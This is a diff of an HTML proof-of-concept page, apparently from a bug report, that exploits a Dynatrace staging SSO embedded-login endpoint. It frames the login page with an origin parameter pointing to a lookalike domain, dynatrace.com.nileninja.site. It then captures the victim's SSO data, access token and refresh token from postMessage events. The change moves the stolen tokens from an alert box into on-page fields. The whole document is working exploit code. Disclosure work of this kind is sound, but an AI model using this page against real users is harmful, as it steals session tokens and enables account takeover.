@@ -10,18 +10,40 @@
   <body> 
     <h1>POC file</h1>
     <iframe src="https://chatstage-one.dynatrace.com/api/sso/oauth2/embedded/login?timestamp=1741941638853&origin=https%3A%2F%2Fchatstage-one.dynatrace.com.nileninja.site"></iframe>
+    <h2>User's Access Token and Refresh Token, Others</h2>
+    <div>
+      SSO: <span id="sso"></span>
+    </div>
+    <div>
+      Access Token: <span id="token"></span>
+    </div>
+    <div>
+      Refresh Token: <span id="refresh"></span>
+    </div>
+    <div>
+      Expires In: <span id="exp"></span>
+    </div>
+    <div>
+      Error: <span id="err"></span>
+    </div>
+    
     <script>    
         window.addEventListener("message", event => {
-          // Access and alert the content as text
-          const alertMessage = `
-              SSO: ${event.data.sso}
-              Access Token: ${event.data.tokenSet.accessToken}
-              Refresh Token: ${event.data.tokenSet.refreshToken}
-              Expires In: ${event.data.tokenSet.expiresInSeconds} seconds
-              Error: ${event.data.error ? parsedResponse.error : 'No error'}
-          `;
-          
-          alert(alertMessage);
+          // Access the elements where the data will be displayed
+          const sso = document.getElementById('sso');
+          const accessToken = document.getElementById('token');
+          const refreshToken = document.getElementById('refresh');
+          const expiryIn = document.getElementById('exp');
+          const error = document.getElementById('err');
+
+          // Check if the data exists in the event and update the fields
+          if (event.data && event.data.sso !== undefined) {
+            sso.textContent = event.data.sso;
+            accessToken.textContent = event.data.tokenSet.accessToken;
+            refreshToken.textContent = event.data.tokenSet.refreshToken;
+            expiryIn.textContent = event.data.tokenSet.expiresInSeconds;
+            error.textContent = event.data.error ? event.data.error : 'No error';
+          }
       });
     </script>
   </body>
